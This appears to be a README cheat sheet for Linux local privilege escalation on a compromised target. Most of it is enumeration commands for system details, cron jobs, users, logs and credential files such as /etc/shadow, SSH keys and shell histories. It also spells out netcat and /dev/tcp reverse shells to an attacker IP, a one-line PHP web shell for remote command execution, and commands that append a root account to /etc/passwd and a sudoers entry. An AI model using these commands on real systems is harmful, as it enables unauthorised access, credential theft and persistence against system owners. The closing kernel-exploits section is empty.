# Linux-LocalPrivilegeEsclation
This is good for those who don't know where to start when it comes to increasing privileges in "Linux" and looking for a simple, practical and professional cheat sheet.
You can increase the level of access from the mentioned techniques that are in the form of basic Linux topics.
enjoy! @__@
# Operating System(Distribution Type & Version)
### Debian Based(like Ubuntu):
```
lsb_release -a
cat /etc/os-release
cat /etc/issue
cat /etc/apt/sources.list
cat /etc/debian_version
```
### RedHat Based(like CentOs or Fedora):
```
cat /etc/redhat-release
cat /etc/*-release
* ~ put your Disturbution name.
```
### Arch Based(like Artix or Garuda):
```
cat /etc/os-release
cat /etc/lsb-release
```
### SUSE Based(like Tumleweed or Leap):
```
cat /etc/SuSE-release
cat /etc/os-release
```
### Slackware:
```
cat /etc/slackware-version
```
### Gentoo Based:
```
emerge --info | grep "repository:"
```
### Mandvira/Mageia:
```
cat /etc/mandriva-release
```
## Kernel and Architecture(x64|x86)
For All Distirbutions:
```
uname -srm
uname -a
ls /boot | grep vmlinuz
cat /proc/version
dmesg | grep Linux
```
## About The Environment
```
env
set
free
ss
df
du
lsblk
lsusb
lsmod
lspci
who
uptime
cat /etc/profile
cat /etc/bashrc
cat /etc/zshrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
```
# Application and Services
### Running Services Per User:
Contains values such as "Time", "PID" and etc:
```
ps aux
ps -ef
top
pstree
cat /etc/services
```
Here, we can limit the result and look for those services that are running by "root" and check for vulnerablities:
```
ps aux | grep root
ps -ef | grep root
```
### List of all apps(running & version):
```
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archives
ls -aRl /etc/ 
ls -alh /var/cache/yum/
```
### Any Schedule?
```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
/etc/init.d
/etc/cron*
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
```
### Development Tools & Languages
```
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc
```
### For Founded Text Files(Sensitive Info):
replace your word with *:
```
grep -i *
```
# Network Environment & Communications
### Network Configuration(DHCP, DNS, Forwarding, etc.):
```
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
```
### about MAC/IP:
```
arp -a
route
```
### A way for packet sniffing:
```
tcpdump
```
Hint: tcpdump tcp dst {ip} {port} and tcp dst {ip} {port}
### Take Reverse Shell:
you can use what you want.
you need static ip for this simple ways but there is some other ways if you don't have static ip address, like ngrok:

1. The first way:
```
nc -nlvp -p {port} # on the attacker system
nc {Attacker IP} {port} -e /bin/bash # on the target system
```
2. The second way:
```
nc -nlvp -p {port} # on the attacker system
mknod backpipe p && nc {Attacker IP} {port} 0<backpipe | /bin/bash 1>backpipe # on the target system
```
3. The third way:
```
nc -nlvp -p {port} # on the attacker system
/bin/bash -i > /dev/tcp/{Attacker IP}/{port} 0<&1 2>&1
```
4. The fourth way:
Here you need to make a file that has ".php" format for exmple in the taget system, here is the code:
```
<?=`$_GET[cmd]`?>
```
and you can use it like this:
```
ip/anything/file.php?cmd={here you have RCE}
```
so, after that you need to make python program(just example) for yourself in your computer(AttackerSystem) that make the request to the web server, parsing the response, and present it to you after that, how can you use it?
```
python rce.py 'ip/anything/file.php?cmd=hostname'
```
There are many ways to do this, but it depends on the conditions of the server you have.

### Who Am I? What Can I Do? All About The Access Level:

```
id    # GID, UID, Groups, Username 
who    # Time, Logged on Users
last    # User login and logout information
cat /etc/passwd | cut -d ":" -f 1    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers    # Permissions and User Access
cat /etc/group    # Information About Groups
cat /etc/shadow    # User and Passwords(SHA256 or SHA512)
```
### Important And Sensitive Information:
Files That May Contain Passwords:
```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
cat ~/.bash_history
cat ~/.nano_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.php_history
cat ~/.bashrc    # User Info
cat ~/.profile    # User Info
cat /etc/security/opasswd # Old Passwords
strings /dev/mem -n10 | grep -i PASS    # In Memory Passwords
find / -name authorized_keys 2> /dev/null    # SSH Keys
find / -name id_rsa 2> /dev/null    # SSH Keys
find / -name id_dsa 2> /dev/null    # SSH Keys
find / -name identity 2> /dev/null    # SSH Keys
find / -name identity.pub 2> /dev/null    # SSH Keys
find / -name ssh_host_dsa_key 2> /dev/null    # SSH Keys
find / -name ssh_host_rsa_key 2> /dev/null    # SSH Keys
find / -name ssh_host_key 2> /dev/null    # SSH Keys
```
# System Files:
### Permissions:
Do we have any perm to write something to a specific file?
Can we reconfigure any service?
Let's see:
```
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone Permission
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner Permission
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group Permission
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other Permission
find /etc/ -readable -type f 2>/dev/null               # Anyone Permission
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone Permission
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null    # Our User Permission
find / -perm -2 -type f 2>/dev/null    # Executable by Anyone
echo 'AnyName::0:0::/root:/bin/bash' >>/etc/passwd    # Check writable Passwd file
echo "AnyName ALL=(ALL:ALL) ALL">>/etc/sudoers    # Check writable Sudoers file
```
### Any Settings or Sensitive Configuration File?
```
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
```
### Log Files:
```
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
find / -name *.log 2> /dev/null
And etc like: auth.log, messeges, dpkg.log, daemon.log, debug.log, dmesg, kern.log, mail.log
```
# Preparation & LPE Exploits
### Writable PATHs:
In the user we have access, do we have the ability to write, if yes, in what PATH?
```
find / -writable -type d 2>/dev/null      # Writeable Folders for our user
find / -perm -222 -type d 2>/dev/null     # Writable Folders for our Anyone
find / -perm -o w -type d 2>/dev/null     # Writable Folders that have at least one permission to write or any user in OS
find / -perm -o x -type d 2>/dev/null     # Writable Folders that have at least one permission to execute or any user in OS
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # Writable Folders that have at least one permission to write, execute or any user in OS
```
### Check Your Weapons for Upload:
```
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
<< You can use "which" command >> ------> example: which wget 
```
### Kernel Exploits:

```

```








